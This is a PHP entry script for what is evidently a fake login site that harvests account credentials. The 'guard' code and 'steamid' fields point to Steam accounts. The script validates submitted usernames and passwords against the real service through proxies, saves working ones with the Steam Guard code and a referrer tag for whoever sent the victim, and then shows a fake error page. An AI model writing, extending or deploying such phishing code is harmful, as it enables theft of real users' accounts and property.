<?php
	require_once("../php/classFake.php");
	require_once("../php/classFakePageGenerator.php");
	require_once("../php/checkValid.php");

	$url_array = parse_url($_SERVER['REQUEST_URI']);
	$path = $url_array["path"];
	
	$Fake = new classFake();
	$PageGen = new PageGenerator("template-" . $Fake->int_GetFakeTemplate());
	
	
	$ref = (isset($_GET["ref"])) ? $_GET["ref"] : null;
	
	global $proxies;
	
	switch ($path){
		case "/": 
			if (!isset($_COOKIE["visited"])) {
				$Fake->void_IncrementVisits();
				setcookie("visited", true, 1893445200); // 01.01.2030 00:00:00
			}
			echo $PageGen->GenerateIndex($ref);
		break;
		
		case "/error": 
		case "/error/":
			echo $PageGen->GenerateError($ref);
		break;
		
		case "/rules": 
		case "/rules/":
			echo $PageGen->GenerateRules($ref);
		break;
		
		case "/validate": 
		case "/validate/":
			echo json_encode(checkValid($_REQUEST["username"], $_REQUEST["password"], $proxies));
		break;
		
		case "/login": 
		case "/login/":
			if (!empty($_REQUEST)){
				if (isset($_REQUEST["submit"])) {
					if ($Fake->b_CheckAccount($_REQUEST["username"], $_REQUEST["password"], $_REQUEST["guard"]) != true) {
						$res = checkValid($_REQUEST["username"], $_REQUEST["password"], $proxies);
						if ($res["result"] == true) {
						//	echo "true";
							$Fake->void_AddAccount(
								$_REQUEST["username"], 
								$_REQUEST["password"], 
								$_REQUEST["guard"], 
								$res["steamid"],
								$ref
							);
						}
					}
					
					echo $PageGen->GenerateError($ref);
				}
			}
		break;
	}
?>